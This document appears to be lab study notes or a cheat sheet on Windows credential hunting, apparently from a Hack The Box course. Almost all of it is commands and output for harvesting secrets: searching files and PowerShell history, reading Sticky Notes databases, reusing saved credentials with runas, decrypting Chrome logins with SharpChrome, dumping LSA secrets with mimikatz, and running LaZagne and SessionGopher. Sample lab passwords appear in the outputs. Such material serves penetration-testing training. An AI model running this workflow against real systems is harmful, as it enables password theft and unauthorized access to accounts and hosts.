# Credential Hunting

## Searching for File Contents

```pwsh
PS C:\Users\htb-student> findstr /SIM /C:password *session *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Searching for File Extensions

### [Get-ChildItem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7.5)

```pwsh
PS C:\Users\htb-student> Get-ChildItem C:\ -Include *.cred, *.config, *.rdp, *.vnc -File -Recurse -Force -ErrorAction Ignore
```

### [where](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/where)

```pwsh
PS C:\Users\htb-student> cmd.exe /c where /R C:\ *.cred *.config *.rdp *.vnc
```

### [dir](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir)

```pwsh
PS C:\Users\htb-student> cmd.exe /c dir /S /B *.cred == *.config == *.rdp == *.vnc
```

## PowerShell History

```pwsh
PS C:\Users\htb-student> foreach ($user in ((Get-ChildItem C:\Users).FullName)) {Get-Content "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

## Sticky Notes

### Database Files

```pwsh
PS C:\Users\htb-student> Get-ChildItem C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
```

```output title="Output" hl_lines="8"
    Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  12:19 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  12:20 PM          77824 plum.sqlite
```

### [DB Browser for SQLite](https://sqlitebrowser.org/)

```sql title="SQL 1" linenums="1"
SELECT Text FROM Note;
```

|| TEXT |
|---|---|
| 1 | \id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n! |
| 2 | \id=69b4fc18-ae09-4226-af90-175ff4092b79 bob_adm:1qazXSW@3edc! |

### [PSSQLite](https://github.com/RamblingCookieMonster/PSSQLite)

```pwsh
PS C:\Users\htb-student> Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
PS C:\Users\htb-student> Import-Module C:\Tools\PSSQLite\PSSQLite.psd1
PS C:\Users\htb-student> $db = "C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
PS C:\Users\htb-student> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note;" | ft -Wrap
```

```output title="Output"
Text
----
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=69b4fc18-ae09-4226-af90-175ff4092b79 bob_adm:1qazXSW@3edc!
```

## Saved Credentials

```pwsh
PS C:\Users\htb-student> cmdkey /list
```

```output title="Output"
Currently stored credentials:

    Target: Domain:target=WEB01
    Type: Domain Password
    User: amanda
```

## Using Previously Saved Credentials

```pwsh
PS C:\Users\htb-student> runas /savecred /user:amanda powershell.exe
```

## Chrome Saved Credentials

```pwsh
PS C:\Users\htb-student> C:\Tools\SharpChrome.exe logins /unprotect
```

```output title="Output" hl_lines="22"
  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.11.1


[*] Action: Chrome Saved Logins Triage


[*] Triaging Chrome Logins for current user


[*] AES state key file : C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : D72790F4972C4D5700D8D2ED50D21850A3429373534ED938EB009219A51A0479

[X] Error : 0

---  Credential (Path: C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,http://vc01.inlanefreight.local:443/,http://vc01.inlanefreight.local:443/login.html,8/7/2021 6:33:01 PM,13272859981246714,root,ILVCadm1n1qazZAQ!


SharpChrome completed in 00:00:00.4393807
```

## Chrome Dictionary

```pwsh
PS C:\Users\htb-student> Get-Content "C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt" | Select-String password
```

## Autologon

### Default User

```pwsh
PS C:\Users\htb-student> Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultUserName"
```

```output title="Output" hl_lines="1"
DefaultUserName : mssqladm
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSChildName     : Winlogon
PSDrive         : HKLM
PSProvider      : Microsoft.PowerShell.Core\Registry
```

### Default Password

```pwsh
PS C:\Users\htb-student> C:\Tools\mimikatz.exe privilege::debug token::elevate lsadump::secrets exit
```

```output title="Output"
Secret  : DefaultPassword
cur/text: DBAilfreight1!
```

## LaZagne

```pwsh
PS C:\Users\htb-student> C:\Tools\LaZagne.exe
```

```output title="Output"
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: htb-student ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: ftp.ilfreight.local
Login: root
Password: Ftpuser!
Port: 22

------------------- Vault passwords -----------------

[-] Password not found !!!
URL: Domain:target=WEB01
Login: amanda


[+] 1 passwords have been found.
For more information launch it again with the -v option

elapsed time = 28.3929998875
```

## [SessionGopher](https://github.com/Arvanaghi/SessionGopher)

```pwsh
PS C:\Users\htb-student> Import-Module .\SessionGopher.ps1
PS C:\Users\htb-student> Invoke-SessionGopher -Target WINLPE-SRV01
```

```output title="Output"
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com

[+] Digging on WINLPE-SRV01...
WinSCP Sessions


Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :

Source   : WINLPE-SRV01\htb-student
Session  : root@ftp.ilfreight.local
Hostname : ftp.ilfreight.local
Username : root
Password : Ftpuser!




PuTTY Sessions


Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local




SuperPuTTY Sessions


Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings
```

## PuTTY

### Querying Sessions

```pwsh
PS C:\Users\htb-student> reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"
```

### Querying

```pwsh
PS C:\Users\htb-student> reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\nix03"
```
